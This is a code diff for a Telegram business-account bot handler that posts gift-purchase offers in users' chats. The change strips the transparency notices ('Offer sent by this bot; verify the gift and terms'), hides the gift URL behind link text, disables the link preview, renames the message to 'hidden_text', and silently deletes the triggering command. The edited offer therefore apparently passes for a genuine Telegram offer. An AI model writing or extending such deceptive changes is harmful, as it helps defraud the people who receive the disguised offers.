@@ -590,34 +590,32 @@ async def business_diag5(message: Message, bot: Bot):
     recipient = await get_setting("recipient_username")
 
     amount_text = f'{int(parsed["amount"]):,}'.replace(",", " ")
-    # Keep the NFT URL visible on its own line so Telegram can generate a link preview.
-    # This is a regular bot message, not a Telegram system offer.
     if language == "eng":
-        offer_message = (
+        hidden_text = (
             f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} has made you an offer</b>\n"
-            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} for the gift {escape(parsed['title'])}</b>\n"
-            f"{escape(parsed['url'])}\n\n"
-            f"This offer expires in <b>{remaining(deal['expires_at'], language)}</b>.\n"
-            "<i>Offer sent by this bot; verify the gift and terms before accepting.</i>"
+            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} for the gift "
+            f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
+            f"This offer expires in <b>{remaining(deal['expires_at'], language)}</b>."
         )
     else:
-        offer_message = (
+        hidden_text = (
             f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} предлагает вам</b>\n"
-            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} за подарок {escape(parsed['title'])}</b>\n"
-            f"{escape(parsed['url'])}\n\n"
-            f"Предложение действительно ещё <b>{remaining(deal['expires_at'], language)}</b>.\n"
-            "<i>Предложение отправлено этим ботом. Перед принятием проверьте подарок и условия.</i>"
+            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} за подарок "
+            f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
+            f"Предложение действительно ещё <b>{remaining(deal['expires_at'], language)}</b>."
         )
     try:
-        # Send the offer first; only then remove the command after a short delay.
+        # First send the replacement offer. Only after success do we remove the command.
         sent = await bot.send_message(
             chat_id=message.chat.id,
             business_connection_id=cid,
-            text=offer_message,
+            text=hidden_text,
             reply_markup=keyboard_for(deal, recipient),
-            disable_web_page_preview=False,
+            disable_web_page_preview=True,
         )
         await update_deal(deal_id, message_id=sent.message_id)
+        # Wait one second, then delete the user's original /diag5 command via the
+        # Business API. delete_message() does not accept business_connection_id.
         await asyncio.sleep(1)
         try:
             await bot.delete_business_messages(
@@ -625,6 +623,7 @@ async def business_diag5(message: Message, bot: Bot):
                 message_ids=[message.message_id],
             )
         except Exception as exc:
+            # Offer is already posted; don't cancel it if Telegram refuses deletion.
             logging.warning("DIAG5: offer sent as message_id=%s, but command deletion failed: %r", sent.message_id, exc)
         logging.info("DIAG5: sent new offer deal_id=%s message_id=%s url=%s amount=%s",
                      deal_id, sent.message_id, parsed["url"], parsed["amount"])
